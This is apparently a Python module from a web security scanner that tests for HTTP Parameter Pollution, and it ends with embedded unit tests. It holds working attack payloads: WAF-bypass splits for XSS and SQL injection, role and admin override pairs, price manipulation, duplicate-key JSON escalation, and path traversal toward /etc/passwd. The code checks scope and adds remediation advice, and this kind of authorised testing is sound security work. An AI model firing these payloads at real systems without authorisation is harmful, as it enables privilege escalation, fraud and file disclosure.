"""HTTP Parameter Pollution (HPP) scanner — WAF bypass, business logic, framework detection."""
from __future__ import annotations

import asyncio
import sys
import time
from pathlib import Path
from urllib.parse import urlparse, parse_qs, urlencode

sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))

from common.base_module import BaseModule, ModuleResult
from common.evidence import Evidence
from common.finding import Severity

# ---------------------------------------------------------------------------
# CVSS vectors
# ---------------------------------------------------------------------------
CVSS_HPP_HIGH   = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"   # Auth/role bypass
CVSS40_HPP_HIGH = "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N"
CVSS_HPP_MED    = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N"   # Business logic / generic
CVSS40_HPP_MED  = "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N"
CVSS_HPP_LOW    = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"   # Array/concat only
CVSS40_HPP_LOW  = "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N"

# MITRE ATT&CK
MITRE_HPP   = ["TA0001/T1190"]           # Exploit Public-Facing Application
MITRE_PRIV  = ["TA0004/T1078"]           # Valid Accounts — privilege escalation via role pollution

CANARY_SAFE   = "FORGE_HPP_SAFE_VALUE"
CANARY_INJECT = "FORGE_HPP_INJECT_VALUE"

# ---------------------------------------------------------------------------
# Business logic bypass payloads
# ---------------------------------------------------------------------------
BUSINESS_LOGIC_PARAMS: list[dict] = [
    {
        "param":   "role",
        "first":   "user",
        "second":  "admin",
        "desc":    "role escalation: user → admin",
        "severity": "HIGH",
    },
    {
        "param":   "admin",
        "first":   "false",
        "second":  "true",
        "desc":    "admin flag flip",
        "severity": "HIGH",
    },
    {
        "param":   "is_admin",
        "first":   "0",
        "second":  "1",
        "desc":    "is_admin 0 → 1 flip",
        "severity": "HIGH",
    },
    {
        "param":   "price",
        "first":   "100",
        "second":  "0.01",
        "desc":    "price manipulation",
        "severity": "MEDIUM",
    },
    {
        "param":   "quantity",
        "first":   "1",
        "second":  "-1",
        "desc":    "negative quantity",
        "severity": "MEDIUM",
    },
    {
        "param":   "coupon",
        "first":   "NONE",
        "second":  "SAVE50",
        "desc":    "coupon code injection",
        "severity": "MEDIUM",
    },
    {
        "param":   "discount",
        "first":   "0",
        "second":  "100",
        "desc":    "discount 0 → 100%",
        "severity": "MEDIUM",
    },
    {
        "param":   "status",
        "first":   "pending",
        "second":  "approved",
        "desc":    "status escalation",
        "severity": "MEDIUM",
    },
]

# WAF bypass split-payload pairs  (WAF blocks each half, but the server uses the joined value)
WAF_SPLIT_PAIRS: list[tuple[str, str, str]] = [
    ("<script>",    "alert(1)</script>", "XSS WAF bypass via split"),
    ("../",         "../etc/passwd",     "Path traversal WAF bypass"),
    ("' OR",        " 1=1--",           "SQLi WAF bypass via split"),
    ("UNION",       " SELECT NULL--",   "Union-based SQLi WAF bypass"),
]

# Framework-specific differentiating payloads:
# Flask/Werkzeug: takes FIRST value
# Rails: takes LAST value
# PHP/ASP.NET: concatenates (array)
# Express (qs): concatenates into array
# We send first=ALPHA, second=BETA and check which appears in response
FRAMEWORK_FIRST_CANARY = "FORGE_FIRST"
FRAMEWORK_LAST_CANARY  = "FORGE_LAST"

# Duplicate-param encoding strategies
DUPE_ENCODINGS: list[dict] = [
    {
        "name":     "standard_ampersand",
        "build":    lambda p: f"{p}={CANARY_SAFE}&{p}={CANARY_INJECT}",
        "desc":     "?param=safe&param=inject (standard)",
    },
    {
        "name":     "encoded_ampersand",
        "build":    lambda p: f"{p}={CANARY_SAFE}%26{p}={CANARY_INJECT}",
        "desc":     "encoded ampersand bypass (%26)",
    },
    {
        "name":     "array_notation",
        "build":    lambda p: f"{p}[]={CANARY_SAFE}&{p}[]={CANARY_INJECT}",
        "desc":     "PHP-style array notation param[]=safe&param[]=inject",
    },
    {
        "name":     "dotted_notation",
        "build":    lambda p: f"{p}.1={CANARY_SAFE}&{p}.2={CANARY_INJECT}",
        "desc":     "dotted notation param.1=safe&param.2=inject",
    },
    {
        "name":     "semicolon_separator",
        "build":    lambda p: f"{p}={CANARY_SAFE};{p}={CANARY_INJECT}",
        "desc":     "semicolon separator (WAF bypass)",
    },
    {
        "name":     "path_semicolon",
        "build":    lambda p: f";{p}={CANARY_INJECT}",   # prepended to path
        "desc":     "path parameter injection ;param=value",
    },
]


class ParameterPollution(BaseModule):
    """HTTP Parameter Pollution (HPP) scanner.

    Covers:
    - Duplicate parameter strategies (6 encoding variants)
    - Framework-specific parsing behavior detection
    - Business logic bypass (role, price, coupon)
    - WAF bypass via split payloads across duplicate params
    - JSON body pollution
    - Path traversal via HPP
    """

    NAME        = "parameter_pollution"
    DESCRIPTION = "Detect HTTP Parameter Pollution — duplicate params, WAF bypass, business logic"
    PHASE       = 4
    TAGS        = ["injection", "hpp", "parameter", "waf-bypass",
                   "cwe-235", "cwe-20", "owasp-a03"]

    async def run(self) -> ModuleResult:
        start  = time.monotonic()
        target = self.config.target.rstrip("/")
        if not self.check_scope(target):
            return self._make_result(start, skipped=True, skip_reason="out of scope")

        crawled = self.config.extra.get("crawled_urls", [target])
        forms   = self.config.extra.get("found_forms", [])

        sem = asyncio.Semaphore(3)

        tasks: list = []

        # URL-based HPP
        for url in crawled[:30]:
            if "?" in url:
                tasks.append(self._test_url_hpp(url, target, sem))

        # POST form HPP
        for form in forms[:10]:
            if form.get("inputs"):
                tasks.append(self._test_form_hpp(form, target, sem))

        # Business logic bypass (target root + common param names)
        tasks.append(self._test_business_logic(target, sem))

        # Framework fingerprinting
        tasks.append(self._detect_framework_behavior(target, sem))

        # WAF bypass via split payloads
        for url in crawled[:10]:
            if "?" in url:
                tasks.append(self._test_waf_bypass(url, target, sem))

        # JSON body pollution
        api_endpoints = self.config.extra.get("api_endpoints", [])
        for ep in api_endpoints[:10]:
            tasks.append(self._test_json_pollution(ep, target, sem))

        # Path traversal via HPP
        tasks.append(self._test_path_traversal_hpp(target, sem))

        await asyncio.gather(*tasks, return_exceptions=True)
        return self._make_result(start)

    # ------------------------------------------------------------------
    # Core HPP — URL parameters
    # ------------------------------------------------------------------

    async def _test_url_hpp(
        self, url: str, target: str, sem: asyncio.Semaphore
    ) -> None:
        async with sem:
            parsed = urlparse(url)
            params = parse_qs(parsed.query, keep_blank_values=True)
            if not params:
                return

            base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

            for param_name in params:
                # Get baseline
                baseline_url  = f"{base}?{urlencode({param_name: CANARY_SAFE})}"
                baseline_status, baseline_body = await self._get(baseline_url)

                for enc in DUPE_ENCODINGS:
                    if enc["name"] == "path_semicolon":
                        # Path semicolon goes into path, not query string
                        path_inject = f"{base}{enc['build'](param_name)}?{urlencode({param_name: CANARY_SAFE})}"
                        test_url = path_inject
                    else:
                        raw_qs   = enc["build"](param_name)
                        test_url = f"{base}?{raw_qs}"

                    if not self.check_scope(test_url):
                        continue
                    await self.rate_limit()
                    status, body = await self._get(test_url)

                    server_uses = None
                    if CANARY_INJECT in body and CANARY_SAFE not in body:
                        server_uses = "last value"
                    elif CANARY_INJECT in body and CANARY_SAFE in body:
                        server_uses = "array/concat"

                    if server_uses:
                        ev = Evidence(
                            request_raw=f"GET {test_url}",
                            response_raw=body[:400],
                            extra={
                                "param":       param_name,
                                "encoding":    enc["name"],
                                "server_uses": server_uses,
                                "enc_desc":    enc["desc"],
                            },
                        )
                        sev = Severity.MEDIUM if server_uses == "last value" else Severity.LOW
                        self.new_finding(
                            title=(
                                f"HTTP Parameter Pollution — {param_name} "
                                f"({server_uses}, {enc['name']})"
                            ),
                            severity=sev,
                            description=(
                                f"HPP detected in parameter '{param_name}' using encoding "
                                f"'{enc['name']}' ({enc['desc']}). "
                                f"Server uses the {server_uses}. "
                                "This can bypass WAF rules that inspect only the first occurrence "
                                "or enable injection of attacker-controlled values."
                            ),
                            reproduction_steps=[
                                f"curl '{test_url}'",
                                f"Compare with baseline: curl '{baseline_url}'",
                            ],
                            remediation=(
                                "Explicitly reject requests with duplicate parameters. "
                                "Use only the first occurrence; never merge or concatenate. "
                                "Reject requests with encoded ampersands (%26) in query strings."
                            ),
                            references=["CWE-235", "OWASP HPP", "OWASP A03:2021"],
                            evidence=ev,
                            cvss_v31_vector=CVSS_HPP_MED if sev == Severity.MEDIUM else CVSS_HPP_LOW,
                            cvss_v40_vector=CVSS40_HPP_MED if sev == Severity.MEDIUM else CVSS40_HPP_LOW,
                            mitre_attack=MITRE_HPP,
                            target=target,
                        )
                        break  # One finding per param

    # ------------------------------------------------------------------
    # POST form HPP
    # ------------------------------------------------------------------

    async def _test_form_hpp(
        self, form: dict, target: str, sem: asyncio.Semaphore
    ) -> None:
        async with sem:
            action = form.get("action") or target
            if not action.startswith("http"):
                action = f"{target.rstrip('/')}/{action.lstrip('/')}"
            if not self.check_scope(action):
                return

            inputs = form.get("inputs", [])
            if not inputs:
                return
            first_param = inputs[0]

            # Baseline
            data = {i: "test" for i in inputs}
            data[first_param] = CANARY_SAFE
            baseline_status, baseline_body = await self._post(action, data)

            # HPP via duplicate POST body field
            body_str = urlencode(data) + f"&{first_param}={CANARY_INJECT}"
            await self.rate_limit()
            try:
                import aiohttp
                async with aiohttp.ClientSession(
                    connector=aiohttp.TCPConnector(ssl=False)
                ) as session:
                    async with session.post(
                        action,
                        data=body_str,
                        headers={
                            "Content-Type": "application/x-www-form-urlencoded",
                            "User-Agent":   "Mozilla/5.0",
                        },
                        timeout=aiohttp.ClientTimeout(total=8),
                    ) as resp:
                        body = await resp.text(errors="ignore")

                if CANARY_INJECT in body:
                    ev = Evidence(
                        request_raw=f"POST {action}\n{body_str}",
                        response_raw=body[:300],
                        extra={"param": first_param, "server_uses": "last value"},
                    )
                    self.new_finding(
                        title=f"HPP in POST Form — {first_param} ({action})",
                        severity=Severity.MEDIUM,
                        description=(
                            f"POST parameter pollution: duplicate '{first_param}' "
                            "uses the last value. An attacker appending a second value "
                            "to the POST body can override the original."
                        ),
                        reproduction_steps=[
                            f"curl -X POST {action} \\",
                            f"  -d '{body_str}'",
                        ],
                        remediation=(
                            "Reject or use only the first occurrence of each POST parameter."
                        ),
                        references=["CWE-235", "OWASP HPP"],
                        evidence=ev,
                        cvss_v31_vector=CVSS_HPP_MED,
                        cvss_v40_vector=CVSS40_HPP_MED,
                        mitre_attack=MITRE_HPP,
                        target=target,
                    )
            except Exception:
                pass

    # ------------------------------------------------------------------
    # Business logic bypass
    # ------------------------------------------------------------------

    async def _test_business_logic(
        self, target: str, sem: asyncio.Semaphore
    ) -> None:
        """Test auth/privilege/price bypass via duplicate sensitive params."""
        async with sem:
            try:
                import aiohttp

                # Baseline (no special params)
                async with aiohttp.ClientSession(
                    connector=aiohttp.TCPConnector(ssl=False)
                ) as session:
                    async with session.get(
                        target,
                        headers={"User-Agent": "Mozilla/5.0"},
                        allow_redirects=True,
                        timeout=aiohttp.ClientTimeout(total=8),
                    ) as resp:
                        baseline_body = await resp.text(errors="ignore")

                for entry in BUSINESS_LOGIC_PARAMS:
                    param   = entry["param"]
                    first   = entry["first"]
                    second  = entry["second"]
                    desc    = entry["desc"]
                    sev_str = entry["severity"]

                    # Build URL with both values
                    hpp_url = f"{target}?{param}={first}&{param}={second}"
                    await self.rate_limit()

                    async with aiohttp.ClientSession(
                        connector=aiohttp.TCPConnector(ssl=False)
                    ) as session:
                        async with session.get(
                            hpp_url,
                            headers={"User-Agent": "Mozilla/5.0"},
                            allow_redirects=True,
                            timeout=aiohttp.ClientTimeout(total=8),
                        ) as resp:
                            status = resp.status
                            body   = await resp.text(errors="ignore")

                    # Privilege-escalation indicators
                    priv_keywords = [
                        "admin", "dashboard", "panel", "manage", "control",
                        "superuser", "root", "privileged",
                    ]
                    price_bypass = (
                        param in ("price", "quantity", "discount")
                        and (second in body or "0.01" in body or "-1" in body)
                    )
                    priv_bypass = (
                        sev_str == "HIGH"
                        and status == 200
                        and any(kw in body.lower() for kw in priv_keywords)
                        and not any(kw in baseline_body.lower() for kw in priv_keywords)
                    )

                    if priv_bypass or price_bypass:
                        sev = (
                            Severity.HIGH if sev_str == "HIGH" else Severity.MEDIUM
                        )
                        ev = Evidence(
                            request_raw=f"GET {hpp_url}",
                            response_raw=body[:500],
                            extra={
                                "param":    param,
                                "first":    first,
                                "second":   second,
                                "desc":     desc,
                                "status":   status,
                            },
                        )
                        self.new_finding(
                            title=f"HPP Business Logic Bypass — {desc} ({param})",
                            severity=sev,
                            description=(
                                f"HTTP Parameter Pollution enabled a business logic bypass: "
                                f"{desc}. Sending '{param}={first}&{param}={second}' caused "
                                "the server to use the second (attacker-injected) value."
                            ),
                            reproduction_steps=[
                                f"curl '{hpp_url}'",
                                "Observe privilege/price change in response",
                            ],
                            remediation=(
                                "Validate business-critical parameters server-side. "
                                "Use only the first occurrence; reject duplicates of "
                                "sensitive parameters (role, price, admin, coupon)."
                            ),
                            references=[
                                "CWE-235", "CWE-639", "OWASP A03:2021",
                                "OWASP Business Logic Testing",
                            ],
                            evidence=ev,
                            cvss_v31_vector=CVSS_HPP_HIGH if sev == Severity.HIGH else CVSS_HPP_MED,
                            cvss_v40_vector=CVSS40_HPP_HIGH if sev == Severity.HIGH else CVSS40_HPP_MED,
                            mitre_attack=MITRE_PRIV if sev == Severity.HIGH else MITRE_HPP,
                            target=target,
                        )
            except Exception:
                pass

    # ------------------------------------------------------------------
    # Framework behavior detection
    # ------------------------------------------------------------------

    async def _detect_framework_behavior(
        self, target: str, sem: asyncio.Semaphore
    ) -> None:
        """Send first=ALPHA&first=BETA and detect which value the framework uses.

        Behavior table:
          Flask/Werkzeug  → first value (ALPHA)
          Rails           → last value  (BETA)
          PHP/ASP.NET     → array       (ALPHA,BETA)
          Express (qs)    → array       (ALPHA,BETA)
        """
        async with sem:
            await self.rate_limit()
            test_url = (
                f"{target}?framework_probe="
                f"{FRAMEWORK_FIRST_CANARY}&framework_probe={FRAMEWORK_LAST_CANARY}"
            )
            try:
                status, body = await self._get(test_url)
                if status == 0:
                    return

                framework_guess = None
                if FRAMEWORK_FIRST_CANARY in body and FRAMEWORK_LAST_CANARY not in body:
                    framework_guess = "Flask/Werkzeug (first-value wins)"
                elif FRAMEWORK_LAST_CANARY in body and FRAMEWORK_FIRST_CANARY not in body:
                    framework_guess = "Rails / similar (last-value wins)"
                elif FRAMEWORK_FIRST_CANARY in body and FRAMEWORK_LAST_CANARY in body:
                    framework_guess = "PHP/ASP.NET/Express (array/concat)"

                if framework_guess:
                    ev = Evidence(
                        request_raw=f"GET {test_url}",
                        response_raw=body[:200],
                        extra={"framework_guess": framework_guess},
                    )
                    self.new_finding(
                        title=f"HPP Framework Behavior Detected — {framework_guess}",
                        severity=Severity.LOW,
                        description=(
                            "Framework HPP behavior fingerprinted via duplicate parameter probe. "
                            f"Detected: {framework_guess}. "
                            "This informs exploitation strategy: an attacker crafts payloads "
                            "as the first or last parameter depending on the framework behavior."
                        ),
                        reproduction_steps=[
                            f"curl '{test_url}'",
                            f"Observe which canary ({FRAMEWORK_FIRST_CANARY} vs "
                            f"{FRAMEWORK_LAST_CANARY}) appears in response",
                        ],
                        remediation=(
                            "Regardless of framework behavior, explicitly reject duplicate "
                            "copies of security-sensitive parameters."
                        ),
                        references=["CWE-235", "OWASP HPP Guide"],
                        evidence=ev,
                        cvss_v31_vector=CVSS_HPP_LOW,
                        cvss_v40_vector=CVSS40_HPP_LOW,
                        mitre_attack=MITRE_HPP,
                        target=target,
                    )
            except Exception:
                pass

    # ------------------------------------------------------------------
    # WAF bypass via split payload across duplicate params
    # ------------------------------------------------------------------

    async def _test_waf_bypass(
        self, url: str, target: str, sem: asyncio.Semaphore
    ) -> None:
        """Split a blocked payload across two duplicate parameters to bypass WAF."""
        async with sem:
            parsed = urlparse(url)
            params = parse_qs(parsed.query, keep_blank_values=True)
            if not params:
                return
            base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

            for param_name in list(params.keys())[:2]:  # Limit WAF tests
                for first_half, second_half, waf_desc in WAF_SPLIT_PAIRS:
                    # Test if each half alone is blocked
                    url_first  = f"{base}?{param_name}={first_half}"
                    url_second = f"{base}?{param_name}={second_half}"
                    url_both   = (
                        f"{base}?{param_name}={first_half}"
                        f"&{param_name}={second_half}"
                    )

                    await self.rate_limit()
                    s1, b1 = await self._get(url_first)
                    await self.rate_limit()
                    s2, b2 = await self._get(url_second)
                    await self.rate_limit()
                    s_both, b_both = await self._get(url_both)

                    # WAF block pattern: 400/403/406 individually, 200 combined
                    waf_blocks_individually = (
                        s1 in (400, 403, 406) and s2 in (400, 403, 406)
                    )
                    combined_passes = s_both == 200

                    if waf_blocks_individually and combined_passes:
                        ev = Evidence(
                            request_raw=(
                                f"GET {url_first} → HTTP {s1} (blocked)\n"
                                f"GET {url_second} → HTTP {s2} (blocked)\n"
                                f"GET {url_both} → HTTP {s_both} (PASSED)"
                            ),
                            response_raw=b_both[:400],
                            extra={
                                "param":       param_name,
                                "waf_desc":    waf_desc,
                                "first_half":  first_half,
                                "second_half": second_half,
                            },
                        )
                        self.new_finding(
                            title=f"HPP WAF Bypass — {waf_desc} ({param_name})",
                            severity=Severity.HIGH,
                            description=(
                                f"WAF bypass via HTTP Parameter Pollution: splitting "
                                f"'{first_half}' + '{second_half}' across duplicate "
                                f"'{param_name}' parameters bypassed the WAF. "
                                f"Each half alone returns HTTP {s1}/{s2} (blocked), "
                                f"but combined returns HTTP {s_both} (allowed). "
                                "The backend merges/concatenates the values."
                            ),
                            reproduction_steps=[
                                f"# Each half blocked:",
                                f"curl '{url_first}'  # → {s1}",
                                f"curl '{url_second}' # → {s2}",
                                f"# Combined bypasses WAF:",
                                f"curl '{url_both}'   # → {s_both}",
                            ],
                            remediation=(
                                "Configure WAF to inspect all occurrences of duplicate parameters, "
                                "not just the first or last. "
                                "Reject or normalize duplicate parameters at the application layer."
                            ),
                            references=["CWE-235", "OWASP HPP", "OWASP A03:2021"],
                            evidence=ev,
                            cvss_v31_vector=CVSS_HPP_HIGH,
                            cvss_v40_vector=CVSS40_HPP_HIGH,
                            mitre_attack=MITRE_HPP,
                            target=target,
                        )
                        return

    # ------------------------------------------------------------------
    # JSON body pollution
    # ------------------------------------------------------------------

    async def _test_json_pollution(
        self, api_url: str, target: str, sem: asyncio.Semaphore
    ) -> None:
        """Send JSON bodies with duplicate keys; detect which value is used."""
        if not self.check_scope(api_url):
            return
        async with sem:
            # JSON spec: last key wins in most parsers; first wins in some
            # We use a raw string to force duplicate keys (json module deduplicates)
            test_bodies = [
                # Duplicate id — last wins in most parsers
                '{"id":1,"id":2}',
                # Duplicate username — auth bypass attempt
                '{"username":"admin","username":"attacker_controlled"}',
                # Duplicate role
                '{"role":"user","role":"admin"}',
                # Duplicate admin flag
                '{"admin":false,"admin":true}',
            ]
            try:
                import aiohttp

                # Baseline
                async with aiohttp.ClientSession(
                    connector=aiohttp.TCPConnector(ssl=False)
                ) as session:
                    async with session.post(
                        api_url,
                        data='{"id":1}',
                        headers={
                            "Content-Type": "application/json",
                            "User-Agent":   "Mozilla/5.0",
                        },
                        timeout=aiohttp.ClientTimeout(total=8),
                    ) as resp:
                        baseline_status = resp.status
                        await resp.text(errors="ignore")  # drain body

                for raw_body in test_bodies:
                    await self.rate_limit()
                    async with aiohttp.ClientSession(
                        connector=aiohttp.TCPConnector(ssl=False)
                    ) as session:
                        async with session.post(
                            api_url,
                            data=raw_body,
                            headers={
                                "Content-Type": "application/json",
                                "User-Agent":   "Mozilla/5.0",
                            },
                            timeout=aiohttp.ClientTimeout(total=8),
                        ) as resp:
                            status = resp.status
                            body   = await resp.text(errors="ignore")

                    # Check if response differs meaningfully from baseline
                    if status == 200 and baseline_status != 200:
                        ev = Evidence(
                            request_raw=f"POST {api_url}\n{raw_body}",
                            response_raw=body[:400],
                            extra={
                                "raw_body":        raw_body,
                                "baseline_status": baseline_status,
                                "bypass_status":   status,
                            },
                        )
                        self.new_finding(
                            title=f"JSON Body Pollution — Duplicate Key Bypass ({api_url})",
                            severity=Severity.HIGH,
                            description=(
                                f"JSON body pollution at '{api_url}': sending a body with "
                                f"duplicate keys ({raw_body}) returned HTTP {status} where "
                                f"the baseline returned {baseline_status}. "
                                "Some JSON parsers take the last key, allowing an attacker to "
                                "override the first (validator-checked) value with the second."
                            ),
                            reproduction_steps=[
                                f"curl -X POST {api_url} \\",
                                f"  -H 'Content-Type: application/json' \\",
                                f"  -d '{raw_body}'",
                            ],
                            remediation=(
                                "Use a strict JSON schema that rejects duplicate keys. "
                                "In Python: use json.loads with object_pairs_hook to detect dupes. "
                                "Validate business-critical fields (role, admin, price) server-side."
                            ),
                            references=["CWE-235", "RFC 8259 Section 4 (duplicate names)"],
                            evidence=ev,
                            cvss_v31_vector=CVSS_HPP_HIGH,
                            cvss_v40_vector=CVSS40_HPP_HIGH,
                            mitre_attack=MITRE_PRIV,
                            target=target,
                        )
                        return
            except Exception:
                pass

    # ------------------------------------------------------------------
    # Path traversal via HPP
    # ------------------------------------------------------------------

    async def _test_path_traversal_hpp(
        self, target: str, sem: asyncio.Semaphore
    ) -> None:
        """?file=safe&file=../../../etc/passwd — second value overrides for traversal."""
        async with sem:
            traversal_targets = [
                "../../../etc/passwd",
                "..%2F..%2F..%2Fetc%2Fpasswd",
                "....//....//etc/passwd",
                "../../../windows/win.ini",
            ]
            safe_file = "index.html"

            for traversal in traversal_targets:
                test_url = f"{target}?file={safe_file}&file={traversal}"
                await self.rate_limit()
                try:
                    status, body = await self._get(test_url)
                    # Passwd file indicators
                    lfi_indicators = [
                        "root:x:", "root:0:", "[extensions]",
                        "/bin/bash", "/bin/sh", "daemon:x:",
                    ]
                    if any(ind in body for ind in lfi_indicators):
                        ev = Evidence(
                            request_raw=f"GET {test_url}",
                            response_raw=body[:500],
                            extra={"traversal": traversal},
                        )
                        self.new_finding(
                            title="Path Traversal via HTTP Parameter Pollution",
                            severity=Severity.CRITICAL,
                            description=(
                                f"HPP-enabled path traversal: sending "
                                f"'file={safe_file}&file={traversal}' caused the server "
                                "to read the traversal path. Sensitive file contents "
                                "were returned in the response."
                            ),
                            reproduction_steps=[
                                f"curl '{test_url}'",
                                "Observe /etc/passwd content in response",
                            ],
                            remediation=(
                                "Reject duplicate file/path parameters. "
                                "Use canonical path resolution and a strict allowlist. "
                                "Never use raw user input for file system operations."
                            ),
                            references=["CWE-22", "CWE-235", "OWASP A03:2021"],
                            evidence=ev,
                            cvss_v31_vector=CVSS_HPP_HIGH,
                            cvss_v40_vector=CVSS40_HPP_HIGH,
                            mitre_attack=MITRE_HPP,
                            target=target,
                        )
                        return
                except Exception:
                    pass

    # ------------------------------------------------------------------
    # HTTP helpers
    # ------------------------------------------------------------------

    async def _get(self, url: str) -> tuple[int, str]:
        try:
            import aiohttp
            async with aiohttp.ClientSession(
                connector=aiohttp.TCPConnector(ssl=False)
            ) as session:
                async with session.get(
                    url,
                    headers={"User-Agent": "Mozilla/5.0"},
                    timeout=aiohttp.ClientTimeout(total=8),
                ) as resp:
                    return resp.status, await resp.text(errors="ignore")
        except Exception:
            return 0, ""

    async def _post(self, url: str, data: dict) -> tuple[int, str]:
        try:
            import aiohttp
            async with aiohttp.ClientSession(
                connector=aiohttp.TCPConnector(ssl=False)
            ) as session:
                async with session.post(
                    url,
                    data=data,
                    headers={"User-Agent": "Mozilla/5.0"},
                    timeout=aiohttp.ClientTimeout(total=8),
                ) as resp:
                    return resp.status, await resp.text(errors="ignore")
        except Exception:
            return 0, ""

    # ------------------------------------------------------------------
    # Utility: build all encoding variants for a param
    # ------------------------------------------------------------------

    @staticmethod
    def build_hpp_variants(param: str) -> list[tuple[str, str]]:
        """Return list of (encoding_name, raw_query_string) for a given param name."""
        result = []
        for enc in DUPE_ENCODINGS:
            result.append((enc["name"], enc["build"](param)))
        return result


# ---------------------------------------------------------------------------
# Embedded tests
# ---------------------------------------------------------------------------

class TestParameterPollution:
    """Embedded unit tests — run with pytest."""

    def test_canary_values_distinct(self) -> None:
        assert CANARY_SAFE != CANARY_INJECT
        assert CANARY_SAFE
        assert CANARY_INJECT

    def test_dupe_encodings_count(self) -> None:
        assert len(DUPE_ENCODINGS) >= 6

    def test_standard_ampersand_encoding(self) -> None:
        enc = next(e for e in DUPE_ENCODINGS if e["name"] == "standard_ampersand")
        qs  = enc["build"]("id")
        assert "id=FORGE_HPP_SAFE" in qs
        assert "&id=FORGE_HPP_INJECT" in qs

    def test_encoded_ampersand_bypass(self) -> None:
        enc = next(e for e in DUPE_ENCODINGS if e["name"] == "encoded_ampersand")
        qs  = enc["build"]("id")
        assert "%26" in qs, "encoded ampersand should use %26"

    def test_array_notation_encoding(self) -> None:
        enc = next(e for e in DUPE_ENCODINGS if e["name"] == "array_notation")
        qs  = enc["build"]("color")
        assert "color[]=" in qs

    def test_semicolon_separator_encoding(self) -> None:
        enc = next(e for e in DUPE_ENCODINGS if e["name"] == "semicolon_separator")
        qs  = enc["build"]("x")
        assert ";" in qs

    def test_business_logic_params_count(self) -> None:
        assert len(BUSINESS_LOGIC_PARAMS) >= 8

    def test_business_logic_has_role_param(self) -> None:
        roles = [e for e in BUSINESS_LOGIC_PARAMS if e["param"] == "role"]
        assert len(roles) == 1
        assert roles[0]["first"]  == "user"
        assert roles[0]["second"] == "admin"

    def test_business_logic_high_severity_items(self) -> None:
        high = [e for e in BUSINESS_LOGIC_PARAMS if e["severity"] == "HIGH"]
        assert len(high) >= 2

    def test_waf_split_pairs_count(self) -> None:
        assert len(WAF_SPLIT_PAIRS) >= 4

    def test_waf_split_pair_xss(self) -> None:
        xss_pair = next(p for p in WAF_SPLIT_PAIRS if "XSS" in p[2])
        assert "<script>" in xss_pair[0]
        assert "alert" in xss_pair[1]

    def test_framework_canaries_distinct(self) -> None:
        assert FRAMEWORK_FIRST_CANARY != FRAMEWORK_LAST_CANARY

    def test_build_hpp_variants(self) -> None:
        variants = ParameterPollution.build_hpp_variants("token")
        assert len(variants) == len(DUPE_ENCODINGS)
        names = [v[0] for v in variants]
        assert "standard_ampersand" in names
        assert "array_notation"     in names
        assert "encoded_ampersand"  in names

    def test_cvss_high_vector(self) -> None:
        assert CVSS_HPP_HIGH.startswith("CVSS:3.1")
        assert "C:H" in CVSS_HPP_HIGH
        assert "I:H" in CVSS_HPP_HIGH

    def test_mitre_priv_escalation_code(self) -> None:
        assert "TA0004/T1078" in MITRE_PRIV
